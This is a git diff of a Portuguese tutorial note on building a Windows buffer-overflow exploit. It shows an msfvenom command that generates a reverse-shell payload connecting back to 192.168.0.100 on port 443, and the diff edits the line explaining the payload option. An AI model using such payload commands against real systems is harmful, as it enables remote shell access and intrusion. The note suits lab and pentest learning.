@@ -36,7 +36,7 @@ Criando um exploit para Windows para BoF:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.100 LPORT=443 -b "\x00\x0a\x0d\x20" EXITFUNC=thread -f python
 ```
 
-**windows/shell_reverser_tcp** ==> Tipo do exploit.  
+**-p windows/shell_reverser_tcp** ==> Tipo do exploit.  
 **LHOST** ==> IP de conexão reversa.  
 **LPORT** ==> Porta de conexão reversa.  
 **-b "\x00\x0a\x0d\x20"** ==> Bad caracteres ou caracteres inválidos.  
